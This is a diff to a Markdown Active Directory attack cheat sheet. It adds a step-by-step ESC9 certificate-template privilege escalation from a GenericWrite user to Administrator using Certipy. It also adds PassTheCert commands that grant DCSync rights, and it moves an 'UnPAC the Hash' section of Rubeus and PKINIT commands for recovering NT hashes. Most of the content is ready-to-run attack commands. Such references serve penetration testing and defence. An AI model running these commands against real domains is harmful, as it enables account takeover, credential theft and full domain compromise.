@@ -62,7 +62,6 @@
     - [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
       - [Using impacket](#using-impacket)
       - [Using Rubeus](#using-rubeus)
-    - [UnPAC The Hash](#unpac-the-hash)
     - [Capturing and cracking Net-NTLMv1/NTLMv1 hashes](#capturing-and-cracking-net-ntlmv1ntlmv1-hashes)
     - [Capturing and cracking Net-NTLMv2/NTLMv2 hashes](#capturing-and-cracking-net-ntlmv2ntlmv2-hashes)
     - [Man-in-the-Middle attacks & relaying](#man-in-the-middle-attacks--relaying)
@@ -82,8 +81,10 @@
       - [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 ](#esc6---editf_attributesubjectaltname2)
       - [ESC7 - Vulnerable Certificate Authority Access Control](#esc7---vulnerable-certificate-authority-access-control)
       - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
+      - [ESC9 - No Security Extension](#esc9---no-security-extension)
       - [Certifried CVE-2022-26923](#certifried-cve-2022-26923)
       - [Pass-The-Certificate](#pass-the-certificate)
+    - [UnPAC The Hash](#unpac-the-hash)
     - [Shadow Credentials](#shadow-credentials)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing DNS Admins Group](#abusing-dns-admins-group)
@@ -257,6 +258,8 @@ Use the correct collector
 * Collect more data for certificates exploitation using Certipy
   ```ps1
   certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound
+  certipy find 'corp.local/john:Passw0rd@dc.corp.local' -old-bloodhound
+  certipy find 'corp.local/john:Passw0rd@dc.corp.local' -vulnerable -hide-admins -username user@domain -password Password123
   ```
 
 Then import the zip/json files into the Neo4J database and query them.
@@ -1915,21 +1918,6 @@ root@kali:~$ klist
 .\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
 ```
 
-### UnPAC The Hash
-
-* Windows
-    ```ps1
-    # request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.
-    C:/> Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
-    ```
-* Linux
-    ```ps1
-    # obtain a TGT by validating a PKINIT pre-authentication
-    $ gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
-    
-    # use the session key to recover the NT hash
-    $ export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
-    ```
 
 ### Capturing and cracking Net-NTLMv1/NTLMv1 hashes
 
@@ -2474,6 +2462,45 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
   certipy relay -ca 172.16.19.100
   ```
 
+
+#### ESC9 - No Security Extension
+
+Requirements:
+* `StrongCertificateBindingEnforcement` set to `1` (default) or `0`
+* Certificate contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
+* Certificate specifies `Any Client` authentication EKU
+* `GenericWrite` over any account A to compromise any account B
+
+**Scenario**
+
+John@corp.local has **GenericWrite** over Jane@corp.local, and we want to compromise Administrator@corp.local. 
+Jane@corp.local is allowed to enroll in the certificate template ESC9 that specifies the **CT_FLAG_NO_SECURITY_EXTENSION** flag in the **msPKI-Enrollment-Flag** value.
+
+* Obtain the hash of Jane with Shadow Credentials (using our GenericWrite)
+    ```ps1
+    certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
+    ```
+* Change the **userPrincipalName** of Jane to be Administrator. :warning: leave the `@corp.local` part
+    ```ps1
+    certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator
+    ```
+* Request the vulnerable certificate template ESC9 from Jane's account.
+    ```ps1
+    certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9
+    # userPrincipalName in the certificate is Administrator 
+    # the issued certificate contains no "object SID"
+    ```
+* Restore userPrincipalName of Jane to Jane@corp.local.
+    ```ps1
+    certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local
+    ```
+* Authenticate with the certificate and receive the NT hash of the Administrator@corp.local user. 
+    ```ps1
+    certipy auth -pfx administrator.pfx -domain corp.local
+    # Add -domain <domain> to your command line since there is no domain specified in the certificate.
+    ```
+
+
 #### Certifried CVE-2022-26923
 
 > An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.
@@ -2516,6 +2543,8 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
 
 #### Pass-The-Certificate
 
+> Pass the Certificate in order to get a TGT, this technique is used in "UnPAC the Hash" and "Shadow Credential"
+
 * Windows
   ```ps1
   # Information about a cert file
@@ -2523,6 +2552,11 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
 
   # From a Base64 PFX
   Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
+
+  # Grant DCSync rights to an user
+  ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --sid <user_SID>
+  # To restore
+  ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --restore restoration_file.txt
   ```
 * Linux
   ```ps1
@@ -2534,7 +2568,29 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
 
   # PFX certificate (file) + password (string, optionnal)
   gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
+
+  # Using Certipy
+  certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
+  certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
   ```
+
+### UnPAC The Hash
+
+Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User via its certificate.
+
+* Windows
+    ```ps1
+    # Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.
+    Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
+    ```
+* Linux
+    ```ps1
+    # Obtain a TGT by validating a PKINIT pre-authentication
+    $ gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
+    
+    # Use the session key to recover the NT hash
+    $ export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
+    ```
 
 
 ### Shadow Credentials
